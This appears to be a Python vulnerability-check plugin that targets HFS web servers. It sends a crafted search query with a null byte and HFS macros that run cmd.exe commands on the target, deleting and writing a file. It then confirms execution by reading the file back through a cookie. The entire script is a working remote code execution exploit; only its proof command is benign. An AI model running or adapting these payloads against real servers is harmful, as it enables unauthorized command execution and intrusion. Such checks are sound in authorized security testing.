# -*- coding:utf-8 -*-

import re
import requests

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if hfs remote code execute vul')
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        check_payload = "/?search==%00{.cookie|out|value={.load|res.}.}"
        exec_payload = "/?search==%00{.exec|cmd.exe /c del res.}{.exec|cmd.exe /c echo>res 123456test.}"
        s = requests.Session()
        s.get(url+exec_payload, headers=headers,timeout=5,verify=False)
        r = s.get(url+check_payload, headers=headers,timeout=5,verify=False)
        check_cookie = r.headers.get("set-cookie")
        if "123456test" in check_cookie:
            msg = 'There is hfs remote code execute vul on url: ' +url+ ' .'
            number = 'v18'
            return True,url,number,msg
        else:
            msg = 'There is no hfs remote code execute vul'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no hfs remote code exec vul'
    number = 'v0'
    return False, url, number, msg

